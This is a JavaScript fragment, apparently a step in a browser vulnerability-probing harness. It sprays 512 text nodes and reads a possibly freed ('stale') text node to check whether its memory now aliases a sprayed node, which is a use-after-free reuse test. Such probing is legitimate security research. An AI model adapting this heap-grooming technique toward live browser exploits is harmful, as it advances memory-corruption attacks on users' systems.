var state = window.__fw14RefcountState;
var result;
var phase = "preflight";
try {
  if (!state || state.mode !== "mutated" || !state.textNode ||
      state.events.indexOf("list") < 0)
    throw new Error("missing_finalized_mutated_list");
  var root = document.createDocumentFragment();
  var allocated = [];
  phase = "spray";
  for (var i = 0; i < 512; i++) {
    var node = document.createTextNode("fw14-reuse-" + i + "-unique");
    root.appendChild(node);
    allocated.push(node);
  }
  window.__fw14TextSpray = { root: root, allocated: allocated };
  if (api && typeof api.markSync === "function") api.markSync("stale_text_before_read");
  phase = "stale_read";
  var observed = state.textNode.data;
  var observedType = state.textNode.nodeType;
  var aliasIndex = -1;
  for (var j = 0; j < allocated.length; j++) {
    if (observed === allocated[j].data) { aliasIndex = j; break; }
  }
  if (api && typeof api.markSync === "function") api.markSync("stale_text_after_read");
  result = { id: "stale_text_reuse", status: "pass", details: {
    spray_count: allocated.length, observed_data: observed,
    observed_type: observedType, alias_index: aliasIndex,
    alias_wrapper_same: aliasIndex >= 0 ? state.textNode === allocated[aliasIndex] : null
  } };
} catch (error) {
  result = { id: "stale_text_reuse", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
